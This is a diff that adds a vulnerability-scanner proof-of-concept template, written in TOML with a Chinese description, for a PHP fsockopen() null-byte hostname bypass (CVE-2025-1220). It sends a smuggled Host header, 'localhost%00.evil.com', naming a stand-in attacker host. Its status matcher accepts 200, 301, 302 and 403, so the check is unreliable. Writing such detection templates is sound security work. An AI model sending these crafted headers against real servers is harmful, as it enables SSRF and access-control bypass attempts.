@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "检测 PHP fsockopen() 空字节主机名绕过漏洞（CVE-2025-1220），通过发送包含空字节的 Host 头测试服务器是否对主机名解析不一致，可能导致 SSRF 或访问控制绕过"
+id = "POC-AVE-2025-0506"
+name = "PHP 主机名空字节终止验证绕过 PoC"
+severity = "low"
+tags = ["ave-2025-0506"]
+vuln_id = [
+    "CVE-2025-1220",
+    "AVE-2025-0506",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "localhost%00.evil.com"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    301,
+    302,
+    403,
+]
+type = "status"
